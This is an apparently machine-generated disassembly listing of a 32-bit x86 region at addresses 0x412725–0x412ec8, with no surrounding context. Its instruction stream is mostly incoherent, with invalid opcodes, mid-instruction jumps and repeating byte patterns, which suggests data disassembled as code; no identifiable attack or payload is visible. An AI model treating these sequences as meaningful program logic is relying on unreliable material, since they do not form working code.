  412725:	add    eax,0x543a6b62
  41272a:	dec    eax
  41272b:	adc    ebp,0x31d132ac
  412731:	cli    
  412732:	and    BYTE PTR [eax+edx*8+0x6b676e05],bh
  412739:	cwde   
  41273a:	cmp    BYTE PTR [edx+0x49],cl
  41273d:	ja     0x4127a0
  41273f:	push   ecx
  412740:	mov    cl,0xd3
  412742:	int    0xc9
  412744:	and    ebx,esp
  412746:	arpl   WORD PTR [edx],bp
  412748:	pop    esp
  412749:	scas   al,BYTE PTR es:[edi]
  41274a:	popa   
  41274b:	inc    esp
  41274c:	sub    al,0xf8
  41274e:	mov    eax,ds:0x41000040
  412753:	inc    ebx
  412754:	add    eax,0x41784062
  412759:	inc    eax
  41275a:	inc    eax
  41275b:	add    BYTE PTR [edi],cl
  41275d:	bound  eax,QWORD PTR [ebx+0x0]
  412760:	add    eax,0x25006240
  412765:	inc    eax
  412766:	add    eax,0x40254143
  41276b:	add    eax,0x7d620000
  412770:	mov    al,0x96
  412772:	(bad)  
  412773:	arpl   WORD PTR [eax+0x3255bbaa],bp
  412779:	lods   eax,DWORD PTR ds:[esi]
  41277a:	dec    esp
  41277b:	mov    esp,0xff0e5873
  412780:	pop    edi
  412781:	cmp    eax,0xaab60524
  412786:	in     al,0x4f
  412788:	xor    DWORD PTR [esi+0x36],esp
  41278b:	jae    0x4127ef
  41278d:	test   al,0x2c
  41278f:	aam    0xe
  412791:	xchg   esp,eax
  412792:	lds    ecx,FWORD PTR [ebx+0x40]
  412795:	gs dec edx
  412797:	imul   esi,DWORD PTR [ecx],0x50a815d0
  41279d:	in     eax,dx
  41279e:	loope  0x4127e3
  4127a0:	add    BYTE PTR [eax],al
  4127a2:	add    BYTE PTR [ecx+0x40],al
  4127a5:	bound  esp,QWORD PTR [esi+0x0]
  4127a8:	inc    eax
  4127a9:	add    eax,0x5400000
  4127ae:	inc    ecx
  4127af:	inc    eax
  4127b0:	inc    eax
  4127b1:	bound  esp,QWORD PTR ds:0x25050043
  4127b7:	inc    ecx
  4127b8:	inc    ebx
  4127b9:	inc    eax
  4127ba:	test   BYTE PTR [eax+0x0],al
  4127bd:	bound  ebx,QWORD PTR [eax+0x62]
  4127c0:	inc    ecx
  4127c1:	inc    eax
  4127c2:	imul   esi,DWORD PTR [ebp-0x5f],0xfffffff2
  4127c6:	add    DWORD PTR [ecx+0x27],0x9259337a
  4127cd:	inc    edi
  4127ce:	mov    esp,0x41a34440
  4127d3:	inc    edx
  4127d4:	push   es
  4127d5:	xor    al,0x5
  4127d7:	sub    BYTE PTR [ecx],ah
  4127d9:	popa   
  4127da:	xchg   ecx,eax
  4127db:	push   edi
  4127dc:	jns    0x412812
  4127de:	retf   
  4127df:	adc    BYTE PTR [ebx+eiz*4-0x45],ah
  4127e3:	scas   eax,DWORD PTR es:[edi]
  4127e4:	data16 aad 0x46
  4127e7:	mov    BYTE PTR [edx],bh
  4127e9:	inc    edx
  4127ea:	xlat   BYTE PTR ds:[ebx]
  4127eb:	push   cs
  4127ec:	nop
  4127ed:	xor    al,BYTE PTR [ecx+0x44]
  4127f0:	xor    DWORD PTR [ecx],esp
  4127f2:	adc    BYTE PTR [edx+0x40],ah
  4127f5:	inc    ecx
  4127f6:	and    eax,0x40000500
  4127fb:	inc    ebx
  4127fc:	add    eax,0x40624041
  412801:	inc    ebx
  412802:	add    eax,0x43402541
  412807:	bound  eax,QWORD PTR [eax+0x43]
  41280a:	int3   
  41280b:	inc    eax
  41280c:	bound  eax,QWORD PTR [eax]
  41280e:	inc    ecx
  41280f:	inc    eax
  412810:	inc    eax
  412811:	add    eax,0x7f94f305
  412816:	xchg   esi,eax
  412817:	rcl    BYTE PTR [ecx],0x11
  41281a:	xor    al,0xd6
  41281c:	pusha  
  41281d:	pop    ecx
  41281e:	xor    al,0xc9
  412820:	int3   
  412821:	sub    BYTE PTR [edi],ah
  412823:	adc    DWORD PTR [edx+0x66],esi
  412826:	xor    eax,0x98627841
  41282b:	jb     0x4127be
  41282d:	or     ecx,DWORD PTR [ecx-0x7e]
  412830:	mov    ah,0xd5
  412832:	addr16 mov bl,0x40
  412835:	fs dec esp
  412837:	ret    
  412838:	sub    ah,BYTE PTR [edx+0x40]
  41283b:	and    eax,0x5406600
  412840:	inc    ebx
  412841:	inc    ecx
  412842:	inc    eax
  412843:	inc    eax
  412844:	inc    ebx
  412845:	add    BYTE PTR [eax],al
  412847:	add    BYTE PTR [edx-0x34],ah
  41284a:	inc    eax
  41284b:	add    eax,0x40004041
  412850:	inc    ecx
  412851:	int3   
  412852:	add    BYTE PTR [ebx-0x7c],al
  412855:	add    eax,0x5406240
  41285a:	bound  eax,QWORD PTR [ecx-0x1]
  41285d:	pop    ebx
  41285e:	xor    BYTE PTR [ebx+0x3d],ah
  412861:	inc    ecx
  412862:	(bad)  
  412863:	out    dx,al
  412864:	adc    DWORD PTR [ebx+0x2b],esi
  412867:	sub    al,BYTE PTR [edx+0x41]
  41286a:	bound  eax,QWORD PTR [ebx+ebp*2+0x42]
  41286e:	inc    esp
  41286f:	mov    esp,0x2c723c03
  412874:	xchg   esi,eax
  412875:	adc    BYTE PTR [eax],ah
  412877:	bound  edx,QWORD PTR [eax+0x62409855]
  41287d:	pop    eax
  41287e:	inc    ecx
  41287f:	add    eax,0x40404340
  412884:	inc    ebx
  412885:	inc    eax
  412886:	test   BYTE PTR [eax],al
  412888:	add    eax,0x40624041
  41288d:	inc    eax
  41288e:	add    BYTE PTR [edx+0x5],ah
  412891:	inc    ebx
  412892:	add    BYTE PTR [eax+0x78],al
  412895:	inc    ecx
  412896:	add    BYTE PTR [eax+0x41],bl
  412899:	bound  esp,QWORD PTR [eax+0x26]
  41289c:	push   0x60624232
  4128a1:	bound  ecx,QWORD PTR [ebp+0x13]
  4128a4:	inc    eax
  4128a5:	inc    ebx
  4128a6:	pop    edx
  4128a7:	xor    BYTE PTR [ecx],0x4f
  4128aa:	lea    ebp,[edi+0x60]
  4128ad:	pusha  
  4128ae:	test   eax,0x44246370
  4128b3:	fs mov eax,0x8c2db4f5
  4128b9:	cs sub al,0x25
  4128bc:	dec    ebp
  4128bd:	adc    eax,DWORD PTR [ecx+0x54]
  4128c0:	inc    ecx
  4128c1:	fcomp  QWORD PTR [esi-0x7e]
  4128c4:	pop    ebp
  4128c5:	jbe    0x412931
  4128c7:	cmp    al,0x40
  4128c9:	test   BYTE PTR [eax],al
  4128cb:	int3   
  4128cc:	bound  eax,QWORD PTR ds:0xcc840f41
  4128d2:	inc    ebx
  4128d3:	add    BYTE PTR [eax+0x0],al
  4128d6:	inc    eax
  4128d7:	inc    eax
  4128d8:	inc    eax
  4128d9:	int3   
  4128da:	add    BYTE PTR ds:0x62404341,al
  4128e0:	pop    eax
  4128e1:	add    BYTE PTR [ebx+0x40],al
  4128e4:	bound  ecx,QWORD PTR [edi]
  4128e6:	inc    eax
  4128e7:	and    BYTE PTR [ecx],ch
  4128e9:	(bad)
  4128ec:	loope  0x4128e2
  4128ee:	inc    ebp
  4128ef:	loope  0x4128c9
  4128f1:	pop    esp
  4128f2:	pop    ecx
  4128f3:	pop    edi
  4128f4:	ins    DWORD PTR es:[edi],dx
  4128f5:	arpl   sp,cx
  4128f7:	mov    dh,0x62
  4128f9:	out    dx,al
  4128fa:	mov    ds:0xcd43a11d,eax
  4128ff:	add    BYTE PTR [eax],al
  412901:	inc    eax
  412902:	inc    eax
  412903:	cmovno eax,DWORD PTR ds:0x40056243
  41290a:	int3   
  41290b:	add    ah,cl
  41290d:	inc    eax
  41290e:	inc    eax
  41290f:	bound  eax,QWORD PTR [ecx+0x0]
  412912:	add    BYTE PTR [edi],cl
  412914:	inc    ebx
  412915:	inc    eax
  412916:	inc    eax
  412917:	add    BYTE PTR [ecx+0x43],al
  41291a:	add    eax,0x40256240
  41291f:	bound  eax,QWORD PTR [eax]
  412921:	sub    DWORD PTR [esp+eax*2],esp
  412924:	jb     0x41291d
  412926:	inc    ebx
  412927:	cmp    al,0x40
  412929:	imul   esi,DWORD PTR [eax],0xe156e12c
  41292f:	jge    0x4128b3
  412931:	and    BYTE PTR [esp+ebx*2-0x69],bh
  412935:	pop    edi
  412936:	push   esp
  412937:	ret    
  412938:	inc    edx
  412939:	inc    ebp
  41293a:	sub    al,0xd5
  41293c:	push   edx
  41293d:	dec    esi
  41293e:	out    0x49,al
  412940:	pop    eax
  412941:	xchg   DWORD PTR [eax+0x6c35e15c],esi
  412947:	ins    DWORD PTR es:[edi],dx
  412948:	enter  0x547,0xe2
  41294c:	inc    edx
  41294d:	inc    eax
  41294e:	push   esp
  41294f:	addr16 inc esp
  412951:	fiadd  DWORD PTR [edi+0x31316144]
  412957:	bound  esp,QWORD PTR [eax]
  412959:	leave  
  41295a:	add    eax,0x4140cc00
  41295f:	inc    eax
  412960:	inc    ebx
  412961:	bound  esp,QWORD PTR ds:0x41400043
  412967:	add    BYTE PTR [eax],al
  412969:	add    eax,0x43624062
  41296e:	inc    ecx
  41296f:	inc    eax
  412970:	inc    eax
  412971:	inc    eax
  412972:	add    eax,0x40624340
  412977:	add    eax,0x40664140
  41297c:	(bad)  
  41297d:	sub    al,0x74
  41297f:	daa    
  412980:	and    bl,al
  412982:	push   ds
  412983:	dec    edx
  412984:	sbb    DWORD PTR [edx-0x5d],0xffffffdd
  412988:	popa   
  412989:	sbb    eax,0xcd6b25cd
  41298e:	je     0x4129d3
  412990:	cmp    ecx,DWORD PTR [ecx+0x7a38906f]
  412996:	mov    edi,0x367040bf
  41299b:	sub    DWORD PTR [ecx-0x12],ecx
  41299e:	mov    bh,BYTE PTR [edi+0x69bf7161]
  4129a4:	and    BYTE PTR [ebp+eiz*4+0x27],al
  4129a8:	dec    eax
  4129a9:	inc    ebx
  4129aa:	add    BYTE PTR ds:0x41107840,al
  4129b0:	bound  eax,QWORD PTR [eax+0x40]
  4129b3:	sldt   WORD PTR [eax-0x34]
  4129b7:	js     0x412a1b
  4129b9:	add    eax,0x40664143
  4129be:	inc    ebx
  4129bf:	add    BYTE PTR [ecx+0x5],al
  4129c2:	js     0x412a04
  4129c4:	bound  eax,QWORD PTR [eax+0x0]
  4129c7:	inc    eax
  4129c8:	cmp    eax,0x2cf5d6bf
  4129cd:	jne    0x41298e
  4129cf:	test   eax,0x464bbf65
  4129d4:	pop    eax
  4129d5:	jg     0x412a53
  4129d7:	and    BYTE PTR [ecx],ch
  4129d9:	sbb    al,0x34
  4129db:	std    
  4129dc:	(bad)
  4129df:	sub    edx,esp
  4129e1:	(bad)
  4129e4:	jbe    0x4129cb
  4129e6:	aas    
  4129e7:	and    BYTE PTR [ebp+0x42],bl
  4129ea:	dec    esp
  4129eb:	pusha  
  4129ec:	mul    cl
  4129ee:	pop    edi
  4129ef:	aas    
  4129f0:	and    al,0x42
  4129f2:	jae    0x412a71
  4129f4:	inc    ecx
  4129f5:	inc    ebx
  4129f6:	inc    eax
  4129f7:	inc    eax
  4129f8:	add    eax,0x434162
  4129fd:	inc    eax
  4129fe:	add    BYTE PTR [edx+0x5],ah
  412a01:	inc    eax
  412a02:	adc    BYTE PTR [edx+0x40],ah
  412a05:	inc    ebx
  412a06:	inc    ecx
  412a07:	add    eax,0x4340
  412a0c:	add    eax,0x404162
  412a11:	add    BYTE PTR [eax+0x43],al
  412a14:	inc    eax
  412a15:	add    eax,0x203b6344
  412a1a:	loope  0x412a18
  412a1c:	inc    ecx
  412a1d:	pop    esp
  412a1e:	sub    al,0xbf
  412a20:	pop    edi
  412a21:	aas    
  412a22:	mov    edi,0x5663a244
  412a27:	enter  0x2028,0xbf
  412a2b:	sub    al,0x42
  412a2d:	dec    ebp
  412a2e:	aad    0xa1
  412a30:	pop    ds
  412a31:	aas    
  412a32:	scas   al,BYTE PTR es:[edi]
  412a33:	sbb    bh,BYTE PTR [esi+eax*2]
  412a36:	fs inc eax
  412a38:	add    BYTE PTR [eax],al
  412a3a:	inc    ecx
  412a3b:	inc    ebx
  412a3c:	add    eax,0x41784062
  412a41:	inc    eax
  412a42:	inc    eax
  412a43:	add    BYTE PTR [edi],cl
  412a45:	bound  eax,QWORD PTR [ebx+0x0]
  412a48:	add    eax,0x25006240
  412a4d:	inc    eax
  412a4e:	add    eax,0x40254143
  412a53:	add    eax,0xd9620000
  412a58:	dec    ebp
  412a59:	inc    ebx
  412a5a:	ins    BYTE PTR es:[edi],dx
  412a5b:	aad    0xd0
  412a5d:	std    
  412a5e:	imul   BYTE PTR [ecx]
  412a60:	adc    esp,DWORD PTR [ecx-0x58]
  412a63:	out    0x62,al
  412a65:	imul   esp,DWORD PTR [esi+0x7d],0x1
  412a69:	or     al,BYTE PTR [ebx-0x1e]
  412a6c:	inc    esp
  412a6d:	jg     0x412a93
  412a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a70:	jae    0x412a55
  412a72:	inc    eax
  412a73:	inc    esp
  412a74:	and    BYTE PTR [eax],bh
  412a76:	push   esp
  412a77:	inc    esi
  412a78:	leave  
  412a79:	mov    edi,0x84c82c38
  412a7e:	int    0x61
  412a80:	mov    esi,0x7318e350
  412a85:	mov    esi,0x62bf725c
  412a8a:	mov    al,ds:0xfa7558cd
  412a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a90:	inc    ebx
  412a91:	add    BYTE PTR [eax],al
  412a93:	add    BYTE PTR [ecx+0x40],al
  412a96:	bound  esp,QWORD PTR [esi+0x0]
  412a99:	inc    eax
  412a9a:	add    eax,0x5400000
  412a9f:	inc    ecx
  412aa0:	inc    eax
  412aa1:	inc    eax
  412aa2:	bound  esp,QWORD PTR ds:0x25050043
  412aa8:	inc    ecx
  412aa9:	inc    ebx
  412aaa:	inc    eax
  412aab:	test   BYTE PTR [eax+0x0],al
  412aae:	bound  ebx,QWORD PTR [eax+0x62]
  412ab1:	inc    ecx
  412ab2:	inc    eax
  412ab3:	leave  
  412ab4:	xor    eax,0x9e2a4591
  412ab9:	inc    esp
  412aba:	jecxz  0x412a7b
  412abc:	inc    di
  412abe:	(bad)  
  412abf:	mov    edx,0x13652c05
  412ac4:	and    DWORD PTR [edi],ebp
  412ac6:	inc    esp
  412ac7:	and    ch,cl
  412ac9:	push   edx
  412aca:	push   0x11
  412acc:	ins    DWORD PTR es:[edi],dx
  412acd:	loope  0x412afb
  412acf:	int3   
  412ad0:	imul   eax,ebp,0x21dbe1
  412ad6:	push   ss
  412ad7:	and    BYTE PTR [esi],0x15
  412ada:	push   esp
  412adb:	inc    eax
  412adc:	and    al,0xe5
  412ade:	lds    eax,FWORD PTR [ebp-0x78]
  412ae1:	cli    
  412ae2:	loope  0x412b34
  412ae4:	cmp    DWORD PTR [edx+0x6150da10],esp
  412aea:	mov    edi,0xfa912477
  412aef:	cli    
  412af0:	adc    BYTE PTR [edx+0x40],ah
  412af3:	inc    ecx
  412af4:	and    eax,0x40000500
  412af9:	inc    ebx
  412afa:	add    eax,0x40624041
  412aff:	inc    ebx
  412b00:	add    eax,0x43402541
  412b05:	bound  eax,QWORD PTR [eax+0x43]
  412b08:	int3   
  412b09:	inc    eax
  412b0a:	bound  eax,QWORD PTR [eax]
  412b0c:	inc    ecx
  412b0d:	inc    eax
  412b0e:	inc    eax
  412b0f:	add    eax,0x87346205
  412b14:	adc    DWORD PTR [edi],edi
  412b16:	jg     0x412b5c
  412b18:	mov    esp,0xdb2150a9
  412b1d:	adc    dh,al
  412b1f:	sub    al,0x5
  412b21:	mov    ah,0x28
  412b23:	bound  eax,QWORD PTR [edi+edi*2+0x62]
  412b27:	inc    eax
  412b28:	and    eax,0x5406600
  412b2d:	inc    ebx
  412b2e:	inc    ecx
  412b2f:	inc    eax
  412b30:	inc    eax
  412b31:	inc    ebx
  412b32:	add    BYTE PTR [eax],al
  412b34:	add    BYTE PTR [edx-0x34],ah
  412b37:	inc    eax
  412b38:	add    eax,0x40004041
  412b3d:	inc    ecx
  412b3e:	int3   
  412b3f:	add    BYTE PTR [ebx-0x7c],al
  412b42:	add    eax,0x5406240
  412b47:	(bad)  
  412b48:	retf   
  412b49:	adc    al,0xc9
  412b4b:	push   esp
  412b4c:	mov    ebp,0x4a651da1
  412b51:	aad    0x81
  412b53:	inc    edx
  412b54:	shr    al,0x12
  412b57:	and    ebx,ebp
  412b59:	inc    ecx
  412b5a:	inc    edx
  412b5b:	push   esp
  412b5c:	cmp    al,0x63
  412b5e:	mov    ch,0xff
  412b60:	leave  
  412b61:	out    dx,al
  412b62:	dec    edx
  412b63:	sbb    al,0xcd
  412b65:	cmp    edi,esi
  412b67:	pop    fs
  412b69:	inc    esp
  412b6a:	cwde   
  412b6b:	dec    esp
  412b6c:	push   0xffffffe3
  412b6e:	inc    ebp
  412b6f:	bound  edx,QWORD PTR [ecx-0xa9dbdd4]
  412b75:	dec    ebp
  412b76:	xlat   BYTE PTR ds:[ebx]
  412b77:	and    DWORD PTR [ecx+0x12],ecx
  412b7a:	sub    BYTE PTR [ecx+0x61],cl
  412b7d:	and    esi,ecx
  412b7f:	inc    eax
  412b80:	bound  ebx,QWORD PTR [eax+0x41]
  412b83:	add    eax,0x40404340
  412b88:	inc    ebx
  412b89:	inc    eax
  412b8a:	test   BYTE PTR [eax],al
  412b8c:	add    eax,0x40624041
  412b91:	inc    eax
  412b92:	add    BYTE PTR [edx+0x5],ah
  412b95:	inc    ebx
  412b96:	add    BYTE PTR [eax+0x78],al
  412b99:	inc    ecx
  412b9a:	add    BYTE PTR [eax+0x41],bl
  412b9d:	bound  ecx,QWORD PTR [esi]
  412b9f:	dec    ebp
  412ba1:	retf   0x343c
  412ba4:	fstp   TBYTE PTR [edi+0x62]
  412ba7:	inc    edx
  412ba8:	and    ecx,ebx
  412baa:	dec    sp
  412bac:	and    ecx,DWORD PTR [ecx+ebp*2]
  412baf:	mov    edx,?
  412bb1:	inc    eax
  412bb2:	xchg   esp,eax
  412bb3:	lds    ebx,FWORD PTR [ebx-0x10]
  412bb6:	pop    ecx
  412bb7:	push   0x4a209144
  412bbc:	and    DWORD PTR [ecx-0x60],edi
  412bbf:	dec    esp
  412bc0:	sub    al,0x2b
  412bc2:	jne    0x412bbe
  412bc4:	inc    edx
  412bc5:	inc    eax
  412bc6:	test   BYTE PTR [eax],al
  412bc8:	int3   
  412bc9:	bound  eax,QWORD PTR ds:0xcc840f41
  412bcf:	inc    ebx
  412bd0:	add    BYTE PTR [eax+0x0],al
  412bd3:	inc    eax
  412bd4:	inc    eax
  412bd5:	inc    eax
  412bd6:	int3   
  412bd7:	add    BYTE PTR ds:0x62404341,al
  412bdd:	pop    eax
  412bde:	add    BYTE PTR [ebx+0x40],al
  412be1:	bound  ecx,QWORD PTR [edi]
  412be3:	inc    eax
  412be4:	inc    eax
  412be5:	and    eax,0xfd421084
  412bea:	clc    
  412beb:	in     eax,0x77
  412bed:	js     0x412b98
  412bef:	inc    esp
  412bf0:	inc    edx
  412bf1:	jg     0x412b99
  412bf3:	mov    edi,0x8d2661cd
  412bf8:	aam    0xd8
  412bfa:	push   esi
  412bfb:	adc    DWORD PTR [ecx+0x4a7d6241],edi
  412c01:	add    eax,0x6010e5da
  412c06:	mov    dh,0x34
  412c08:	sub    BYTE PTR [eax-0x5c],dl
  412c0b:	dec    ebp
  412c0c:	pop    ecx
  412c0d:	jmp    0x412bb7
  412c0f:	push   cs
  412c10:	adc    DWORD PTR gs:[esi+0x20],0x40400000
  412c18:	cmovno eax,DWORD PTR ds:0x40056243
  412c1f:	int3   
  412c20:	add    ah,cl
  412c22:	inc    eax
  412c23:	inc    eax
  412c24:	bound  eax,QWORD PTR [ecx+0x0]
  412c27:	add    BYTE PTR [edi],cl
  412c29:	inc    ebx
  412c2a:	inc    eax
  412c2b:	inc    eax
  412c2c:	add    BYTE PTR [ecx+0x43],al
  412c2f:	add    eax,0x40256240
  412c34:	bound  eax,QWORD PTR [eax]
  412c36:	mov    ds:0x4ad54633,eax
  412c3b:	pop    ebx
  412c3c:	mov    ecx,0x2a67102e
  412c41:	xor    ebp,DWORD PTR ds:0x5fcba2cf
  412c47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c48:	adc    dl,ah
  412c4a:	ret    0x4665
  412c4d:	arpl   WORD PTR [eax],dx
  412c4f:	push   ecx
  412c50:	inc    edx
  412c51:	inc    esp
  412c52:	retf   
  412c53:	bound  esi,QWORD PTR [ebp+0x56605f58]
  412c59:	sub    al,0x4b
  412c5b:	jb     0x412bfd
  412c5d:	jecxz  0x412c64
  412c5f:	add    ah,cl
  412c61:	inc    eax
  412c62:	inc    ecx
  412c63:	inc    eax
  412c64:	inc    ebx
  412c65:	bound  esp,QWORD PTR ds:0x41400043
  412c6b:	add    BYTE PTR [eax],al
  412c6d:	add    eax,0x43624062
  412c72:	inc    ecx
  412c73:	inc    eax
  412c74:	inc    eax
  412c75:	inc    eax
  412c76:	add    eax,0x40624340
  412c7b:	add    eax,0x40664140
  412c80:	inc    esp
  412c81:	push   0x58260c38
  412c86:	push   esi
  412c87:	loopne 0x412d08
  412c89:	inc    eax
  412c8a:	loope  0x412c59
  412c8c:	xchg   ecx,eax
  412c8d:	bound  edi,QWORD PTR [ecx+0x121f1265]
  412c93:	inc    ebp
  412c94:	sub    DWORD PTR [eax-0x62],esp
  412c97:	fcom   DWORD PTR [ebx]
  412c99:	push   edx
  412c9a:	push   esi
  412c9b:	(bad)  
  412c9c:	pop    edi
  412c9d:	add    dl,BYTE PTR [esi+0x23]
  412ca0:	jns    0x412cc6
  412ca2:	ss inc esp
  412ca4:	cs sbb al,0xb9
  412ca7:	jbe    0x412c7b
  412ca9:	outs   dx,DWORD PTR ds:[esi]
  412caa:	push   ebp
  412cab:	sub    al,0xf9
  412cad:	and    bl,BYTE PTR [ecx+eiz*1+0x43222c]
  412cb4:	add    eax,0x41107840
  412cb9:	bound  eax,QWORD PTR [eax+0x40]
  412cbc:	sldt   WORD PTR [eax-0x34]
  412cc0:	js     0x412d24
  412cc2:	add    eax,0x40664143
  412cc7:	inc    ebx
  412cc8:	add    BYTE PTR [ecx+0x5],al
  412ccb:	js     0x412d0d
  412ccd:	bound  eax,QWORD PTR [eax+0x0]
  412cd0:	inc    eax
  412cd1:	retf   
  412cd2:	or     ah,cl
  412cd4:	arpl   WORD PTR [esi-0x61],sp
  412cd7:	inc    edi
  412cd8:	inc    ebx
  412cd9:	inc    edx
  412cda:	lds    ebp,FWORD PTR [ebx-0xd985a46]
  412ce0:	and    eax,0x2054abfa
  412ce5:	call   0x4040:0x4341baa3
  412cec:	add    eax,0x434162
  412cf1:	inc    eax
  412cf2:	add    BYTE PTR [edx+0x5],ah
  412cf5:	inc    eax
  412cf6:	adc    BYTE PTR [edx+0x40],ah
  412cf9:	inc    ebx
  412cfa:	inc    ecx
  412cfb:	add    eax,0x4340
  412d00:	add    eax,0x404162
  412d05:	add    BYTE PTR [eax+0x43],al
  412d08:	inc    eax
  412d09:	add    eax,0xc3ee4d44
  412d0e:	ds data16 jle 0x412ccc
  412d12:	pusha  
  412d13:	test   al,0xf8
  412d15:	push   esp
  412d16:	shl    BYTE PTR [ebp+0x45275d25],0x6
  412d1d:	leave  
  412d1e:	xor    al,0x98
  412d20:	sbb    DWORD PTR [bp+si],ebx
  412d23:	sub    al,cl
  412d25:	mov    eax,0x62e17303
  412d2a:	loope  0x412d3d
  412d2c:	bound  eax,QWORD PTR ds:0x40d1
  412d32:	inc    ecx
  412d33:	inc    ebx
  412d34:	add    eax,0x41784062
  412d39:	inc    eax
  412d3a:	inc    eax
  412d3b:	add    BYTE PTR [edi],cl
  412d3d:	bound  eax,QWORD PTR [ebx+0x0]
  412d40:	add    eax,0x25006240
  412d45:	inc    eax
  412d46:	add    eax,0x40254143
  412d4b:	add    eax,0xa9620000
  412d50:	xor    BYTE PTR [eax+0x42],0x42
  412d54:	aad    0x41
  412d56:	pop    ebp
  412d57:	xchg   esi,eax
  412d58:	arpl   WORD PTR [edx],si
  412d5a:	and    BYTE PTR [eax+0x5b],bh
  412d5d:	dec    esp
  412d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d5f:	inc    edx
  412d60:	dec    edi
  412d61:	or     DWORD PTR [ecx],esp
  412d63:	enter  0xc0e5,0x69
  412d67:	mov    ebp,0xcb28d1e1
  412d6c:	jge    0x412d3b
  412d6e:	jae    0x412d04
  412d70:	imul   edx,DWORD PTR [edx+0x21],0x10
  412d74:	sub    BYTE PTR [ebx+ebp*4+0x15],dl
  412d78:	popa   
  412d79:	mov    cl,0x41
  412d7b:	push   esi
  412d7c:	push   es
  412d7d:	inc    ebx
  412d7e:	add    BYTE PTR [eax],al
  412d80:	add    BYTE PTR [ecx+0x40],al
  412d83:	bound  esp,QWORD PTR [esi+0x0]
  412d86:	inc    eax
  412d87:	add    eax,0x5400000
  412d8c:	inc    ecx
  412d8d:	inc    eax
  412d8e:	inc    eax
  412d8f:	bound  esp,QWORD PTR ds:0x25050043
  412d95:	inc    ecx
  412d96:	inc    ebx
  412d97:	inc    eax
  412d98:	test   BYTE PTR [eax+0x0],al
  412d9b:	bound  ebx,QWORD PTR [eax+0x62]
  412d9e:	inc    ecx
  412d9f:	inc    eax
  412da0:	jae    0x412d5a
  412da2:	inc    edi
  412da3:	inc    esi
  412da4:	sbb    BYTE PTR [eax-0x2abe32ca],ah
  412daa:	out    dx,al
  412dab:	loope  0x412d85
  412dad:	fwait
  412dae:	loope  0x412db3
  412db0:	mov    eax,ds:0x4129fa6f
  412db5:	xor    BYTE PTR [edi-0x16],dl
  412db8:	ret    
  412db9:	(bad)  
  412dba:	loopne 0x412ddf
  412dbc:	jg     0x412dfe
  412dbe:	lds    edi,FWORD PTR [eax+0x43]
  412dc1:	jbe    0x412dd0
  412dc3:	mov    edi,0x38452051
  412dc8:	jg     0x412e02
  412dca:	leave  
  412dcb:	adc    BYTE PTR fs:[edx+0x40],ah
  412dcf:	inc    ecx
  412dd0:	and    eax,0x40000500
  412dd5:	inc    ebx
  412dd6:	add    eax,0x40624041
  412ddb:	inc    ebx
  412ddc:	add    eax,0x43402541
  412de1:	bound  eax,QWORD PTR [eax+0x43]
  412de4:	int3   
  412de5:	inc    eax
  412de6:	bound  eax,QWORD PTR [eax]
  412de8:	inc    ecx
  412de9:	inc    eax
  412dea:	inc    eax
  412deb:	add    eax,0x642b9f05
  412df0:	add    al,0xe4
  412df2:	jno    0x412e1a
  412df4:	mov    al,ds:0xc5a81d9f
  412df9:	push   ebx
  412dfa:	mov    esp,0x220a2d89
  412dff:	inc    esp
  412e00:	daa    
  412e01:	pushf  
  412e02:	data16 jae 0x412e60
  412e05:	fild   QWORD PTR [esi+0x2a]
  412e08:	loop   0x412e46
  412e0a:	jne    0x412dea
  412e0c:	popa   
  412e0d:	or     al,BYTE PTR [edx+0x12]
  412e10:	imul   eax,ebp,0xffffffdc
  412e13:	inc    ebp
  412e14:	sub    eax,0x4062e1df
  412e19:	and    eax,0x5406600
  412e1e:	inc    ebx
  412e1f:	inc    ecx
  412e20:	inc    eax
  412e21:	inc    eax
  412e22:	inc    ebx
  412e23:	add    BYTE PTR [eax],al
  412e25:	add    BYTE PTR [edx-0x34],ah
  412e28:	inc    eax
  412e29:	add    eax,0x40004041
  412e2e:	inc    ecx
  412e2f:	int3   
  412e30:	add    BYTE PTR [ebx-0x7c],al
  412e33:	add    eax,0x5406240
  412e38:	bound  eax,QWORD PTR [ebx+0x1c]
  412e3b:	push   esp
  412e3c:	inc    eax
  412e3d:	dec    ebp
  412e3e:	and    eax,0x6257406e
  412e43:	jae    0x412dd5
  412e45:	mov    al,ds:0x206076d2
  412e4a:	cld    
  412e4b:	mov    eax,0x71e3dc6b
  412e50:	outs   dx,DWORD PTR ds:[esi]
  412e51:	push   ebp
  412e52:	lds    eax,FWORD PTR ds:0x5c6346c0
  412e58:	push   ss
  412e59:	retf   
  412e5a:	dec    edi
  412e5b:	retf   
  412e5c:	inc    eax
  412e5d:	bound  ebx,QWORD PTR [eax+0x41]
  412e60:	add    eax,0x40404340
  412e65:	inc    ebx
  412e66:	inc    eax
  412e67:	test   BYTE PTR [eax],al
  412e69:	add    eax,0x40624041
  412e6e:	inc    eax
  412e6f:	add    BYTE PTR [edx+0x5],ah
  412e72:	inc    ebx
  412e73:	add    BYTE PTR [eax+0x78],al
  412e76:	inc    ecx
  412e77:	add    BYTE PTR [eax+0x41],bl
  412e7a:	bound  ecx,QWORD PTR [edx]
  412e7c:	mov    ch,0x21
  412e7e:	nop
  412e7f:	xor    BYTE PTR [ecx],dl
  412e81:	dec    eax
  412e82:	stos   BYTE PTR es:[edi],al
  412e83:	int3   
  412e84:	fisub  DWORD PTR [eax+eiz*2+0x61]
  412e88:	push   esi
  412e89:	inc    ecx
  412e8a:	xchg   ecx,eax
  412e8b:	add    eax,0xd41210d
  412e90:	cmp    ecx,DWORD PTR [ebx-0x44]
  412e93:	retf   
  412e94:	pop    ebx
  412e95:	push   ebx
  412e96:	xchg   ecx,eax
  412e97:	popa   
  412e98:	dec    ebp
  412e99:	clc    
  412e9a:	adc    eax,0x37a1ea90
  412e9f:	inc    ebx
  412ea0:	retf   
  412ea1:	enter  0xbf49,0xf9
  412ea5:	call   DWORD PTR [ebx-0x1e]
  412ea8:	cmp    BYTE PTR [ebx-0x3a],ah
  412eab:	push   0x7a9bf6d8
  412eb0:	xor    al,0x31
  412eb2:	push   0x40ad0500
  412eb7:	test   BYTE PTR [eax],al
  412eb9:	int3   
  412eba:	bound  eax,QWORD PTR ds:0xcc840f41
  412ec0:	inc    ebx
  412ec1:	add    BYTE PTR [eax+0x0],al
  412ec4:	inc    eax
  412ec5:	inc    eax
  412ec6:	inc    eax
  412ec7:	int3   
  412ec8:	add    BYTE PTR ds:0x62404341,al
